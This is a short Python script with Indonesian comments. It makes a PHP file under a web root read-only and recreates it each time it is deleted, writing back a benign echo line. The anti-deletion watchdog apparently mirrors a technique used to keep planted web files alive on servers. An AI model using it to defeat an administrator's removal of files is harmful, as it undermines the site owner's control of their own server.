import os
import stat
import time

# Path ke file yang ingin dilindungi
file_name = '/home/ignited/public_html/antidel.php'

# Fungsi untuk mengatur file menjadi read-only
def make_file_protected(file_path):
    # Mengubah permission file menjadi read-only untuk pemiliknya
    os.chmod(file_path, stat.S_IRUSR)  # Membuat file hanya bisa dibaca oleh owner
    
    # Menyimpan status awal file, misalnya file tidak bisa diubah
    print(f"File {file_path} now protected from modification.")
    
    # Proses pengulangan untuk memeriksa apakah file dihapus atau dimodifikasi
    while True:
        time.sleep(1)  # Periksa setiap detik
        if not os.path.exists(file_path):  # Jika file dihapus
            print(f"File {file_path} was deleted! Recreating it...")
            # Jika file dihapus, kita bisa membuatnya lagi
            with open(file_path, 'w') as f:
                f.write("<?php echo 'This is a protected file'; ?>")
            print(f"File {file_path} recreated!")
            os.chmod(file_path, stat.S_IRUSR)  # Pastikan tetap read-only
            
# Memanggil fungsi untuk mengaktifkan proteksi file
make_file_protected(file_name)
